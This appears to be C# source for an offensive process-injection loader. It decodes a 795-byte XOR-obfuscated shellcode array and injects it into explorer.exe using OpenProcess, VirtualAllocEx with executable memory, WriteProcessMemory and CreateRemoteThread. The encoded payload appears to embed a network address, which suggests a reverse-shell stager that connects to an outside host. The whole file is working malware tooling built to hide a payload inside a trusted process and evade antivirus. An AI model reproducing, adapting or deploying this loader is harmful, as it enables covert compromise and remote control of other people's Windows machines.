﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PS_Reflective_DLLInject_ExNuma_XOR
{
    public class Inject
    {
        // Importing kernel32.dll which contains all calls for process injection and shellcode execution
        // Reference: http://pinvoke.net/
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Public class containing shellcode and process injection
        public Inject()
        {
            // Find explorer process 
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;
            //Console.Write("Explorer PID: {0}\n", pid);

            // Shellcode below
            byte[] sc = new byte[795] {
0x82, 0x36, 0xfd, 0x9a, 0x8e, 0x96, 0xb2, 0x7e, 0x7e, 0x7e, 0x3f, 0x2f, 0x3f, 0x2e, 0x2c,
0x36, 0x4f, 0xac, 0x2f, 0x1b, 0x36, 0xf5, 0x2c, 0x1e, 0x36, 0xf5, 0x2c, 0x66, 0x28, 0x36,
0xf5, 0x2c, 0x5e, 0x36, 0xf5, 0x0c, 0x2e, 0x36, 0x71, 0xc9, 0x34, 0x34, 0x33, 0x4f, 0xb7,
0x36, 0x4f, 0xbe, 0xd2, 0x42, 0x1f, 0x02, 0x7c, 0x52, 0x5e, 0x3f, 0xbf, 0xb7, 0x73, 0x3f,
0x7f, 0xbf, 0x9c, 0x93, 0x2c, 0x36, 0xf5, 0x2c, 0x5e, 0x3f, 0x2f, 0xf5, 0x3c, 0x42, 0x36,
0x7f, 0xae, 0x18, 0xff, 0x06, 0x66, 0x75, 0x7c, 0x71, 0xfb, 0x0c, 0x7e, 0x7e, 0x7e, 0xf5,
0xfe, 0xf6, 0x7e, 0x7e, 0x7e, 0x36, 0xfb, 0xbe, 0x0a, 0x19, 0x36, 0x7f, 0xae, 0x3a, 0xf5,
0x3e, 0x5e, 0x37, 0x7f, 0xae, 0x2e, 0xf5, 0x36, 0x66, 0x9d, 0x28, 0x36, 0x81, 0xb7, 0x33,
0x4f, 0xb7, 0x3f, 0xf5, 0x4a, 0xf6, 0x36, 0x7f, 0xa8, 0x36, 0x4f, 0xbe, 0x3f, 0xbf, 0xb7,
0x73, 0xd2, 0x3f, 0x7f, 0xbf, 0x46, 0x9e, 0x0b, 0x8f, 0x32, 0x7d, 0x32, 0x5a, 0x76, 0x3b,
0x47, 0xaf, 0x0b, 0xa6, 0x26, 0x3a, 0xf5, 0x3e, 0x5a, 0x37, 0x7f, 0xae, 0x18, 0x3f, 0xf5,
0x72, 0x36, 0x3a, 0xf5, 0x3e, 0x62, 0x37, 0x7f, 0xae, 0x3f, 0xf5, 0x7a, 0xf6, 0x36, 0x7f,
0xae, 0x3f, 0x26, 0x3f, 0x26, 0x20, 0x27, 0x24, 0x3f, 0x26, 0x3f, 0x27, 0x3f, 0x24, 0x36,
0xfd, 0x92, 0x5e, 0x3f, 0x2c, 0x81, 0x9e, 0x26, 0x3f, 0x27, 0x24, 0x36, 0xf5, 0x6c, 0x97,
0x35, 0x81, 0x81, 0x81, 0x23, 0x36, 0x4f, 0xa5, 0x2d, 0x37, 0xc0, 0x09, 0x17, 0x10, 0x17,
0x10, 0x1b, 0x0a, 0x7e, 0x3f, 0x28, 0x36, 0xf7, 0x9f, 0x37, 0xb9, 0xbc, 0x32, 0x09, 0x58,
0x79, 0x81, 0xab, 0x2d, 0x2d, 0x36, 0xf7, 0x9f, 0x2d, 0x24, 0x33, 0x4f, 0xbe, 0x33, 0x4f,
0xb7, 0x2d, 0x2d, 0x37, 0xc4, 0x44, 0x28, 0x07, 0xd9, 0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab,
0x96, 0x71, 0x7e, 0x7e, 0x7e, 0x4f, 0x47, 0x4c, 0x50, 0x4f, 0x48, 0x46, 0x50, 0x4a, 0x47,
0x50, 0x4f, 0x4c, 0x4e, 0x7e, 0x24, 0x36, 0xf7, 0xbf, 0x37, 0xb9, 0xbe, 0xc5, 0x7f, 0x7e,
0x7e, 0x33, 0x4f, 0xb7, 0x2d, 0x2d, 0x14, 0x7d, 0x2d, 0x37, 0xc4, 0x29, 0xf7, 0xe1, 0xb8,
0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab, 0x96, 0x8e, 0x7e, 0x7e, 0x7e, 0x51, 0x18, 0x4c, 0x27,
0x3f, 0x2a, 0x30, 0x32, 0x18, 0x10, 0x4c, 0x4a, 0x30, 0x1d, 0x2f, 0x06, 0x04, 0x1c, 0x33,
0x39, 0x3a, 0x0c, 0x19, 0x0c, 0x33, 0x11, 0x1d, 0x26, 0x35, 0x10, 0x3b, 0x1c, 0x0a, 0x12,
0x38, 0x53, 0x38, 0x4a, 0x17, 0x06, 0x48, 0x4c, 0x1d, 0x47, 0x2f, 0x09, 0x3b, 0x4d, 0x29,
0x07, 0x2b, 0x12, 0x06, 0x3a, 0x12, 0x21, 0x29, 0x38, 0x4a, 0x4d, 0x2f, 0x24, 0x48, 0x4d,
0x2b, 0x33, 0x17, 0x37, 0x11, 0x04, 0x2f, 0x0b, 0x27, 0x46, 0x15, 0x0d, 0x07, 0x17, 0x0f,
0x4e, 0x3c, 0x08, 0x19, 0x35, 0x4e, 0x07, 0x16, 0x39, 0x34, 0x4b, 0x3d, 0x0e, 0x2c, 0x16,
0x10, 0x47, 0x39, 0x24, 0x3c, 0x35, 0x1a, 0x31, 0x18, 0x15, 0x09, 0x2d, 0x1d, 0x0d, 0x14,
0x30, 0x53, 0x10, 0x10, 0x35, 0x2b, 0x19, 0x4f, 0x38, 0x39, 0x09, 0x0b, 0x12, 0x46, 0x16,
0x46, 0x36, 0x27, 0x18, 0x16, 0x27, 0x1d, 0x3f, 0x35, 0x27, 0x4d, 0x1d, 0x07, 0x0e, 0x4c,
0x26, 0x2a, 0x18, 0x11, 0x09, 0x3f, 0x4b, 0x10, 0x36, 0x2a, 0x36, 0x3a, 0x0a, 0x26, 0x28,
0x31, 0x2e, 0x2a, 0x3d, 0x0d, 0x0b, 0x3b, 0x28, 0x17, 0x33, 0x49, 0x30, 0x21, 0x2a, 0x18,
0x29, 0x16, 0x12, 0x2f, 0x18, 0x2a, 0x06, 0x04, 0x1f, 0x0f, 0x0c, 0x06, 0x53, 0x0d, 0x35,
0x11, 0x1a, 0x3f, 0x46, 0x26, 0x38, 0x2a, 0x32, 0x21, 0x34, 0x27, 0x53, 0x21, 0x2c, 0x47,
0x4a, 0x28, 0x12, 0x0d, 0x39, 0x15, 0x4b, 0x15, 0x48, 0x3c, 0x30, 0x16, 0x04, 0x11, 0x18,
0x0e, 0x16, 0x1c, 0x2f, 0x14, 0x1c, 0x3a, 0x34, 0x0d, 0x06, 0x48, 0x2d, 0x46, 0x2b, 0x48,
0x14, 0x08, 0x3a, 0x14, 0x39, 0x2e, 0x3b, 0x2a, 0x09, 0x31, 0x7e, 0x36, 0xf7, 0xbf, 0x2d,
0x24, 0x3f, 0x26, 0x33, 0x4f, 0xb7, 0x2d, 0x36, 0xc6, 0x7e, 0x4c, 0xd6, 0xfa, 0x7e, 0x7e,
0x7e, 0x7e, 0x2e, 0x2d, 0x2d, 0x37, 0xb9, 0xbc, 0x95, 0x2b, 0x50, 0x45, 0x81, 0xab, 0x36,
0xf7, 0xb8, 0x14, 0x74, 0x21, 0x36, 0xf7, 0x8f, 0x14, 0x61, 0x24, 0x2c, 0x16, 0xfe, 0x4d,
0x7e, 0x7e, 0x37, 0xf7, 0x9e, 0x14, 0x7a, 0x3f, 0x27, 0x37, 0xc4, 0x0b, 0x38, 0xe0, 0xf8,
0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab, 0x33, 0x4f, 0xbe, 0x2d, 0x24, 0x36, 0xf7, 0x8f, 0x33,
0x4f, 0xb7, 0x33, 0x4f, 0xb7, 0x2d, 0x2d, 0x37, 0xb9, 0xbc, 0x53, 0x78, 0x66, 0x05, 0x81,
0xab, 0xfb, 0xbe, 0x0b, 0x61, 0x36, 0xb9, 0xbf, 0xf6, 0x6d, 0x7e, 0x7e, 0x37, 0xc4, 0x3a,
0x8e, 0x4b, 0x9e, 0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab, 0x36, 0x81, 0xb1, 0x0a, 0x7c, 0x95,
0xd4, 0x96, 0x2b, 0x7e, 0x7e, 0x7e, 0x2d, 0x27, 0x14, 0x3e, 0x24, 0x37, 0xf7, 0xaf, 0xbf,
0x9c, 0x6e, 0x37, 0xb9, 0xbe, 0x7e, 0x6e, 0x7e, 0x7e, 0x37, 0xc4, 0x26, 0xda, 0x2d, 0x9b,
0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab, 0x36, 0xed, 0x2d, 0x2d, 0x36, 0xf7, 0x99, 0x36, 0xf7,
0x8f, 0x36, 0xf7, 0xa4, 0x37, 0xb9, 0xbe, 0x7e, 0x5e, 0x7e, 0x7e, 0x37, 0xf7, 0x87, 0x37,
0xc4, 0x6c, 0xe8, 0xf7, 0x9c, 0x7e, 0x7e, 0x7e, 0x7e, 0x81, 0xab, 0x36, 0xfd, 0xba, 0x5e,
0xfb, 0xbe, 0x0a, 0xcc, 0x18, 0xf5, 0x79, 0x36, 0x7f, 0xbd, 0xfb, 0xbe, 0x0b, 0xac, 0x26,
0xbd, 0x26, 0x14, 0x7e, 0x27, 0xc5, 0x9e, 0x63, 0x54, 0x74, 0x3f, 0xf7, 0xa4, 0x81, 0xab
};

            // 0x7e = ~
            // Decrypt XOR shellcode
            for (int i = 0; i < sc.Length; i++)
            {
                sc[i] = (byte)((uint)sc[i] ^ 0x7e);
            }

            // Open process memory and allocate space for shellcode
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Write shellcode in explorer's allocated space
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, sc, sc.Length, out outSize);

            // Create a thread with the shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
